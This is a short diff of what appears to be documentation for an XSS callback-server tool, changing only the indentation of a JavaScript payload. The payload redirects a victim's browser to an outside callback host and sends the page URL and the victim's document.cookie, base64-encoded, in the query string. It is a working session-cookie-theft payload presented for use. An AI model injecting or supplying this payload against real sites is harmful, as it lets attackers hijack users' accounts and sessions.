@@ -19,9 +19,9 @@ Refine your payload as required, or it may get triggered unexpectedly.
 ```javascript
 const token = "w3lRZ87e";
 if (location.hash != token) self.location = "https://mycallbackserver.net/callback.php" + 
-                	"?referer=" + encodeURIComponent( btoa(self.location.href) ) + 
-                	"&data=" + encodeURIComponent( btoa(document.cookie) ) + 
-                	"&token=" + encodeURIComponent( btoa(token) );
+  "?referer=" + encodeURIComponent( btoa(self.location.href) ) + 
+  "&data=" + encodeURIComponent( btoa(document.cookie) ) + 
+  "&token=" + encodeURIComponent( btoa(token) );
 ```
 
 <sup>If you choose not to include a referer in the URL parameters, the callback server defaults to the **`Referer`** header of the request.<br>If neither a referer parameter or Referer header is present, the panic address is used.</sup>
